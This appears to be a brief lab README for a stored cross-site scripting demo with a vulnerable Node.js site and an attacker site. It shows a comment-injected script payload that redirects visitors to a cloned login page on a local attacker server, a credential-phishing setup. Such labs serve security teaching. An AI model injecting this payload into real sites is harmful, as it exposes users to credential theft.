This deals with stored XSS vulnerabilities. You will find a vulnerable Node.js website and an attacking website. The attacker logs in with their credentials (e.g., user1/password1) and injects the following script into the comments:
```bash
<script>
  window.location.href = 'http://localhost:4000/login';
</script>
```

which redirects users to a clone page of the hacker's site."
